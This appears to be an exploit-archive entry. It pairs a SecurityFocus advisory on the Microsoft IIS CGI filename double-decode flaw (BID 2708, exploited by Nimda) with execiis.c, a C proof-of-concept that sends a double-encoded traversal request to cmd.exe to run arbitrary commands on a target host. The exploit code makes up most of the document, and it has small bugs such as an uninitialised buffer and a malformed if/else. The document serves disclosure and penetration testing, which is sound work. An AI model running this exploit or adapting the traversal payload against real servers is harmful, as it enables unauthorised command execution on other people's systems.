source: http://www.securityfocus.com/bid/2708/info

Due to a flaw in the handling of CGI filename program requests, remote users can execute arbitrary commands on an IIS host.

When IIS receives a CGI filename request, it automatically performs two actions before completing the request:

1. IIS decodes the filename to determine the filetype and the legitimacy of the file. IIS then carries out a security check.

2. When the security check is completed, IIS decodes CGI parameters.

A flaw in IIS involves a third undocumented action: Typically, IIS decodes only the CGI parameter at this point, yet the previously decoded CGI filename is mistakenly decoded twice. If a malformed filename is submitted and circumvents the initial security check, the undocumented procedure will decode the malformed request, possibly allowing the execution of arbitrary commands.

Note that arbitrary commands will be run with the IUSR_machinename account privileges. Reportedly, various encoding combinations under Windows 2000 Server and Professional may yield different outcomes.

Personal Web Server 1.0 and 3.0 are reported vulnerable to this issue.

The worm Nimda(and variants) actively exploit this vulnerability. 

/*
 *
 * execiis.c - (c)copyright Filip Maertens
 * BUGTRAQ ID: 2708 - Microsoft IIS CGI Filename Decode Error
 *
 * DISCLAIMER:    This  is  proof of concept code.  This means, this
code
 * may only be used on approved systems in order to test the
availability
 * and integrity of machines  during a legal penetration test.  In no
way
 * is the  author of  this exploit  responsible for the use and result
of
 * this code.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>


/* Modify this value to whichever sequence you want.
 *
 * %255c = %%35c = %%35%63 = %25%35%63 = /
 *
 */

#define SHOWSEQUENCE "/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+"



int main(int argc, char *argv[])
{

 struct sockaddr_in sin;
 char recvbuffer[1], stuff[200];
 int create_socket;

 printf("iisexec.c | Microsoft IIS CGI Filename Decode Error |
<filip@securax.be>\n-------------------------------------------------------------------------\n");

 if (argc < 3)
 {
  printf(" -- Usage: iisexec [ip] [command]\n");
  exit(0);
 }


if (( create_socket = socket(AF_INET,SOCK_STREAM,0)) > 0 )
 printf(" -- Socket created.\n");

 sin.sin_family = AF_INET;
 sin.sin_port = htons(80);
 sin.sin_addr.s_addr = inet_addr(argv[1]);

if (connect(create_socket, (struct sockaddr *)&sin,sizeof(sin))==0)
 printf(" -- Connection made.\n");
else
 { printf(" -- No connection.\n"); exit(1); }


 strcat(stuff, "GET ");
 strcat(stuff, SHOWSEQUENCE);
 strcat(stuff, argv[2]);
 strcat(stuff, " HTTP/1.0\n\n");

 memset(recvbuffer, '\0',sizeof(recvbuffer));

 send(create_socket, stuff, sizeof(stuff), 0);
 recv(create_socket, recvbuffer, sizeof (recvbuffer),0);



 if ( ( strstr(recvbuffer,"404") == NULL ) )

     printf(" -- Command output:\n\n");
     while(recv(create_socket, recvbuffer, 1, 0) > 0)
   {
     printf("%c", recvbuffer[0]);
   }

 else
  printf(" -- Wrong command processing. \n");

 close(create_socket);

}
